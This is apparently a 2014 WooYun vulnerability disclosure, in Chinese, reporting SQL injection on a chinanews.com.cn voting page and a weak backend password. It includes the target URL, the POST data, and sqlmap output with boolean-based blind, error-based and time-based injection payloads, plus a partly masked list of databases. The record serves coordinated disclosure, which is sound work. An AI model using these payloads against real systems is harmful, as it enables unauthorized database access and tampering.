wybug_title: 中国新闻网存在SQL注射漏洞，可任意发期刊新闻
wybug_status: 已交由第三方合作机构(cncert国家互联网应急中心)处理
wybug_detail:
漏洞详情 披露状态：   									2014-09-28：	细节已通知厂商并且等待厂商处理中									2014-09-29：	厂商已经确认，细节仅向厂商公开									2014-10-09：	细节向核心白帽子及相关领域专家公开									2014-10-19：	细节向普通白帽子公开									2014-10-29：	细节向实习白帽子公开									2014-11-12：	细节向公众公开  简要描述： SQL注射，后台也是弱口令。 详细说明：  POST型注射http://table.chinanews.com.cn/vote2008/view_results.php?sid=709 postdata="item1366%5B%5D=5861&item1366%5B%5D=5863&submit=%EF%BF%BD%E1%BD%BB%EF%BF%BD%EF%BF%BD&item1366%5B%5D=5862"   漏洞证明：  
Place: POSTParameter: item1366[]    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: item1366[]=5861&item1366[]=5863&submit=%EF%BF%BD%E1%BD%BB%EF%BF%BD%EF%BF%BD&item1366[]=5862 AND 1275=1275    Type: error-based    Title: MySQL >= 5.0 AND error-based - WHERE or HAVING clause    Payload: item1366[]=5861&item1366[]=5863&submit=%EF%BF%BD%E1%BD%BB%EF%BF%BD%EF%BF%BD&item1366[]=5862 AND (SELECT 6960 FROM(SELECT COUNT(*),CONCAT(0x716b627171,(SELECT (CASE WHEN (6960=6960) THEN 1 ELSE 0 END)),0x7171757271,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)    Type: AND/OR time-based blind    Title: MySQL > 5.0.11 AND time-based blind    Payload: item1366[]=5861&item1366[]=5863&submit=%EF%BF%BD%E1%BD%BB%EF%BF%BD%EF%BF%BD&item1366[]=5862 AND SLEEP(5)available databases [29]:[*] 2008**[*] 2008**[*] 2008**[*] 2008pa**[*] 2008pa**[*] 200**[*]
